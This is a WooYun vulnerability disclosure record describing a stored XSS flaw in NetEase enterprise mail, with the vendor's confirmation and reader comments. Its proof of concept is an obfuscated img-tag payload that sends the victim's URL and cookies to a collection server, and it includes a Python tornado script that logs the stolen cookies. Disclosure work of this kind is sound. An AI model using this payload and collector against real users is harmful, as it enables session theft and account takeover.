{"id": 37702, "wybug_id": "wooyun-2015-0106134", "wybug_title": "网易企业邮箱储存型xss可获取用户cookie", "wybug_corp": "网易", "wybug_author": "zene", "wybug_date": "2015-04-06 09:47", "wybug_open_date": "2015-05-24 13:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向公众公开  简要描述： 储存型xss啦～ 详细说明：  邮件正文直接xss啦～网易企业邮箱显示邮件正文时候会自动把 http://xxx.xxx 转换成 <a href=\"http://xxx.xxx\" target=\"_blank\">http://xxx.xxx</a>。但是转换不当导致同一行内的任意文本标签被转换为 html 元素。不多说，直接来：POC：邮件正文直接写\n<img src='' onmouseover=\"eval(unescape('f%3DencodeURIComponent%2Cr%3Ddocument%2CN%3Dnew%20XMLHttpRequest%2CN.open%28%27post%27%2CdecodeURIComponent%28%27http%3A%252f%252f127.0.0.1%3A8000%27%29%2Ctrue%29%2CN.setRequestHeader%28%27content-type%27%2C%27application/x-www-form-urlencoded%27%29%2CN.send%28%27a%3D%27+f%28r.URL%29+%27%26t%3D%27+f%28r.cookie%29%29'))\"></img>http://aoeu.com\n注意后面的http://xxx.xxx是必须要有的，否则不会被尖括号不会被转义回来。onmouseover换成onerror也行，更直接。（但是我的ff似乎被玩坏了，不管哪里的onerror内容不执行了QAQ……chrome下可以）简易服务器：\n#!/usr/bin/env python3import tornadofrom tornado.ioloop import IOLoopfrom tornado.web import Applicationfrom threading import Lockm = Lock()class MainHandler(tornado.web.RequestHandler):    def post(self):        url = self.get_argument('a', default='')        cookie = self.get_argument('t', default='')        m.acquire()        print('url:    {0}\\n'.format(url))        print('cookie: {0}\\n\\n'.format(cookie))        with open('log', 'a') as f:            f.write('url:    {0}\\n'.format(url))            f.write('cookie: {0}\\n\\n'.format(cookie))        m.release()        self.write('')def main():    app = Application([        (r'/', MainHandler),    ])    app.listen(8000)    IOLoop.instance().start()if __name__ == '__main__':    main()\n\n\n\n\n   漏洞证明：  见说明。   修复方案：  正确处理超链接。   版权声明：转载请注明来源 zene@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-04-09 13:53 厂商回复： 感谢您对网易的关注，问题已经处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-06 12:50 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  这个屌    \n     2015-04-06 13:11 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  收费邮箱？    \n     2015-04-06 17:33 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  屌啊    \n     2015-04-06 19:38 |    \t\t小清新 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 以后再写)\t\t \n  mark刘茗    \n     2015-04-06 20:27 |    \t\tNing \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        )\t\t \n  哦    \n     2015-04-06 21:12 |    \t\tanony_mous \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | no info)\t\t \n  diao    \n     2015-04-06 23:45 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  这种还没补完啊    \n     2015-04-07 06:30 |    \t\tcatcat520 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 大家好，我是刚学网络 00后，求照顾，谢谢)\t\t \n  关注一下，顺便 @疯狗 我提交的储存型xss如果不能通过，是否能确认一下，一直是未审核怕管理员忽略了，谢谢    \n     2015-04-07 10:44 |    \t\t毛猴 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:18        | 一 只 怀 有 梦 想 的 猴 ......)\t\t \n  dom dom    \n     2015-05-09 13:59 |    \t\tB1gstar \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        | 向各位学习来了。)\t\t \n  这个没有奖励啊    \n     2015-05-10 23:53 |    \t\tzsrkmyn \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:3        | lazy...)\t\t \n  @B1gstar 好像发了个礼品但是我没收到……话说玩意寄礼品是寄平邮还是快递啊？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}